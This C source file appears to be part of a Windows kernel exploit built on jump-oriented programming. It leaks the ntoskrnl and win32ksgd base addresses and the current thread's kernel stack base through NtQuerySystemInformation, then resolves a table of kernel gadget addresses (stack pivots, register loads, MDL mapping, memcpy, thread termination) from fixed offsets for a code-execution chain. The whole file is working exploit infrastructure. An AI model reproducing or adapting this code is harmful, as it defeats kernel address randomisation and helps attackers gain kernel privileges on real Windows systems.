#include "jop/gadgets.h"
#include "jop/offsets.h"
#include "utils/alloc.h"
#include "utils/error.h"
#include "utils/native.h"
#include <processthreadsapi.h>
#include <stddef.h>
#include <stdio.h>
#include <string.h>
#include <winternl.h>

bool gadgets_get_ntosknrl_base_address(
    size_t *ntoskrnl_base, size_t *win32ksgd_base, size_t *stack_address, HANDLE child_pipe
)
{
    NTSTATUS status = 0;
    ULONG size = 0;
    bool result = false, found = false;
    PRTL_PROCESS_MODULES modules = nullptr;
    SYSTEM_PROCESS_INFORMATION *process_infos = nullptr;
    SYSTEM_EXTENDED_THREAD_INFORMATION *thread_info = nullptr;

    status = NtQuerySystemInformation(SystemModuleInformation, nullptr, 0, &size);
    if (status != STATUS_INFO_LENGTH_MISMATCH)
    {
        CHILD_LOG_ERROR(child_pipe, "NtQuerySystemInformation failed with status: %lx\n", status);
        goto end;
    }

    modules = jalloc(size);
    if (modules == nullptr)
    {
        CHILD_LOG_ERROR(child_pipe, "Failed allocating memory.\n");
        goto end;
    }

    status = NtQuerySystemInformation(SystemModuleInformation, modules, size, &size);
    if (!NT_SUCCESS(status))
    {
        CHILD_LOG_ERROR(child_pipe, "NtQuerySystemInformation failed with status: %lx\n", status);
        goto end;
    }

    for (size_t i = 0; i < modules->NumberOfModules; i++)
    {
        if (_stricmp(
                (char *)(modules->Modules[i].FullPathName + modules->Modules[i].OffsetToFileName),
                "ntoskrnl.exe"
            ) == 0)
        {
            CHILD_LOG_SUCCESS(
                child_pipe,
                "Found ntoskrnl base address at %llx\n",
                (size_t)modules->Modules[i].ImageBase
            );
            *ntoskrnl_base = (size_t)modules->Modules[i].ImageBase;
        }
        else if (_stricmp(
                     (char *)(modules->Modules[i].FullPathName +
                              modules->Modules[i].OffsetToFileName),
                     "win32ksgd.sys"
                 ) == 0)
        {
            CHILD_LOG_SUCCESS(
                child_pipe,
                "Found win32kbase base address at %llx\n",
                (size_t)modules->Modules[i].ImageBase
            );
            *win32ksgd_base = (size_t)modules->Modules[i].ImageBase;
        }
    }

    status = NtQuerySystemInformation(SystemExtendedProcessInformation, nullptr, 0, &size);
    if (status != STATUS_INFO_LENGTH_MISMATCH)
    {
        CHILD_LOG_ERROR(child_pipe, "NtQuerySystemInformation failed with status: %lx\n", status);
        goto end;
    }

    process_infos = jalloc(size);
    if (process_infos == nullptr)
    {
        CHILD_LOG_ERROR(child_pipe, "Failed allocating memory for process infos.\n");
        goto end;
    }

    status = NtQuerySystemInformation(SystemExtendedProcessInformation, process_infos, size, &size);
    if (!NT_SUCCESS(status))
    {
        CHILD_LOG_ERROR(
            child_pipe,
            "Failed querying SystemExtendProcessInformation. ntstatus: %lx\n",
            status
        );
        goto end;
    }

    do
    {
        if ((size_t)process_infos->UniqueProcessId != GetCurrentProcessId())
        {
            process_infos = ((void *)process_infos + process_infos->NextEntryOffset);
            continue;
        }

        thread_info = (void *)process_infos + sizeof(SYSTEM_PROCESS_INFORMATION);
        for (size_t i = 0; i < process_infos->NumberOfThreads; i++)
        {
            if ((size_t)thread_info[i].ThreadInfo.ClientId.UniqueThread != GetCurrentThreadId())
            {
                continue;
            }
            CHILD_LOG_SUCCESS(
                child_pipe,
                "Stack base thread %lld: %llx\n",
                i,
                (size_t)thread_info[i].StackBase
            );
            *stack_address = (size_t)thread_info[i].StackBase;

            found = true;

            break;
        }

    } while (found != true);

    result = true;
end:

    // if (modules != nullptr)
    // jfree(modules);

    // if (process_infos != nullptr)
    // jfree(process_infos);

    return result;
}

bool gadgets_resolve_all_gadgets(
    size_t ntoskrnl_base,
    size_t stack_address,
    size_t win32ksgd_base,
    GadgetsData **gadgets,
    HANDLE child_pipe
)
{
    HMODULE ntoskrnl_module = {0};
    bool result = false;
    GadgetsData *resolved = nullptr;

    resolved = jalloc(sizeof(GadgetsData));
    if (resolved == nullptr)
    {
        LOG_ERROR("Failed allocating memory.\n");
        goto end;
    }

    resolved->longjump = ntoskrnl_base + LONGJUMP;
    resolved->longjump_internal = ntoskrnl_base + LONGJUMP_INTERNAL;
    resolved->call_rbp_jmp_deref_rsi = ntoskrnl_base + OFFSET_CALL_RBP_JMP_DEREF_RSI;
    resolved->mov_rcx_r13_call_rax = ntoskrnl_base + MOV_RCX_R13_CALL_RAX;
    resolved->load_first_arguments_from_stack = ntoskrnl_base + LOAD_ARGS;
    resolved->jump_dispatcher = ntoskrnl_base + HALP_LM_INDENTITY_STUB;
    resolved->push_rax_jmp_rbx = ntoskrnl_base + OFFSET_PUSH_RAX_JMP_RBX;
    resolved->stack = stack_address;
    resolved->ntoskrnl = ntoskrnl_base;
    resolved->win32ksgd = win32ksgd_base;
    resolved->sgd_get_user_session_state = win32ksgd_base + SGDGetUserSessionState;
    resolved->add_rsp_jmp_rax = resolved->load_first_arguments_from_stack + 25;
    resolved->call_rax_load_regs_jmp_rax = ntoskrnl_base + CALL_DISPATCHER;
    resolved->pop_rax_jmp_deref_rsi = ntoskrnl_base + POP_RAX_JMP_DEREF_RSI;
    resolved->save_rax_rsi = ntoskrnl_base + SAVE_RAX;
    resolved->add_rsp_pop_rbp = ntoskrnl_base + POP_RBP;
    resolved->add_gadget = ntoskrnl_base + ADD_GADGET;
    resolved->io_allocate_mdl = ntoskrnl_base + IO_ALLOCATE_MDL;
    resolved->memcpy = ntoskrnl_base + MEMCPY;
    resolved->mm_probe_and_lock_pages = ntoskrnl_base + MM_PROBE_AND_LOCK_PAGES;
    resolved->mm_map_locked_pages_specify_cache = ntoskrnl_base + MM_MAP_LOCKED_PAGES_SPECIFY_CACHE;
    resolved->zw_terminate_thread = ntoskrnl_base + ZW_TERMINATE_THREAD;
    resolved->pop_rsp_ret = ntoskrnl_base + POP_RSP_RET;
    resolved->add_rsp_pop_rsi_ret = ntoskrnl_base + ADD_RSP_POP_RSI_RET;
    resolved->add_rsp_jmp_r8 = ntoskrnl_base + ADD_RSP_JMP_R8;

    CHILD_LOG_SUCCESS(child_pipe, "\tntoskrnl!longjump -> 0x%llx\n", resolved->longjump);

    *gadgets = resolved;

    result = true;

end:

    if (ntoskrnl_module != NULL)
        FreeLibrary(ntoskrnl_module);

    return result;
}